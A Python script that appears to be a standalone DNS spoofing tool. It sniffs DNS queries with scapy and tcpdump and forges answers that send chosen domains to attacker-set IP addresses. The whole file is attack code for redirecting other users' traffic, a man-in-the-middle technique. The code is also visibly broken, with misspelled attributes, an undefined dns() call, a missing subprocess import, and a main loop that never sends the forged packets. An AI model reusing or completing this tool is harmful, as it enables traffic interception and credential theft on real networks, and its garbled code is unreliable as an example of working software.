#!/usr/bin/env python3
from scapy.all import *
import json
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
import time

class DNSSpoofer:
	def __init__(self, config_file="dns_config.json"):
		self.load_config(config_file)
		self.running = True
	def load_config(self, config_file):
		with open(config_file) as f:
			config = json.load(f)
		self.spoof_domains = config ["spoof_domains"]
		self.mode = config.get("mode", "whitelist")

	def process_packet(self, packet):
		try:
			if packet.haslayer(DNS) and packet[DNS].qr == 0:
				query_name = packet[DNS].qd.qname.decode().rstrip('.')
				print(f"DNS Query: {query_name}")
				if query_name in self.spoof.domains:
					spoofed_ip = self.spoof_domains[query_name]
					response = IP(dst=packet[I].src, src=packet[IP].dst) / \
						UDP(dport=packet[UDP].sport, sport=53) / \
						DNS(id=packet[DNS].id,
							qr=1,
							aa=0,
							rd=packet[DNS].rd,
							qd=packet[DNS].qd,
							an=DNSRR(rrname=packet[DNS].qd.qname,
								ttl=300,
								rdata=spoofed_ip))
					send(response, verbode=0)
					print(f"Sent spoofed response {query_name} -> {spoofed_ip}")

		except Exception as e:
			print(f"Error: {e}")
	def should_spoof(self, domain):
		domain = domain.rstrip('.')
		if self.mode == "whitelist":
			return domain in self.spoof_domains
		else: #blacklist
			return domain not in self.spoof_domains

	def create_spoofed_response(self, original_packet):
		try:
			spoofed_ip = self.spoof_sdomains[original_packet[DNSQR].qname.decode().rstrip('.')]
			response = IP(dst=original_packet[IP].src, src=original_packet[IP].dst) / \
				UDP(dport=original_packet[UDP].sport, sport=53)/ \
				dns(
					id=dns.id,
					qr=1,
					aa=0,
					rd=dns.rd,
					qd=dns.qd,
					an=DNSRR(
						rrname=original_packet[DNS].qd.qname,
						ttl=300,
						rdata=spoofed_ip
					)
				)
			return response
		except Exception as e:
			print(f"Error: {e}")
			return None
	def start(self):
		print("Starting DNS Spoofer")

		cmd = ["tcpdump", "-i", "eth0", "-n", "-l", "udp port 53"]
		process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		try:
			for line in iter(process.stdout.readline, b''):
				if not self.running:
					break
				line = line.decode('utf-8')
				print(f"Raw tcpdump {line}")

				if "A?" in line:
					parts = line.split()
					try:
						src_ip = parts[2].split('.')[0]
						query = parts[parts.index("A?") + 1].rstrip('.')
						print(f"DNS query {query} from {src_ip}")

						if self.should_spoof(query):
							spoofed_ip = self.spoof_domains.get(query, "10.10.10.10")
							print(f"Should spoof {query} -> {spoofed_ip}")
					except (ValueError, IndexError) as e:
						continue
		except KeyboardInterrupt:
			print("Stopping")
		finally:
			self.running = False
			process.terminate()

if __name__ == "__main__":
	spoofer = DNSSpoofer()
	spoofer.start()
